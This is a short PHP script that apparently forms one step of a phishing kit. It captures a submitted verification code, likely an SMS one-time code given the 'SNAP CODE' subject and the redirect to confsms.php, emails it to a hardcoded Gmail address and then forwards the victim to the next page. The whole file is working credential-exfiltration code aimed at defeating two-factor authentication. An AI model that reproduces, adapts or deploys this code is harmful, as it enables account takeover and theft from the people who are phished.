<?php

session_start();
if (isset($_POST['code']))
{
$message = "<p style='color:red;'>CODE  ". $_SESSION['valid']." : ". $_POST['code']."</p>";

$_SESSION['valid']="valid";

  $headers = "Reply-To: yurisparow@gmail.com \n";
  $headers .= "Content-Type: text/html; charset=\"iso-8859-1\"";

    mail('omar.med.gh@gmail.com', 'SNAP CODE', $message,$headers);
   
}

$_SESSION['valid']="valid";
$_SESSION['code']=$_POST['code'];

 

header('Location:confsms.php');

?>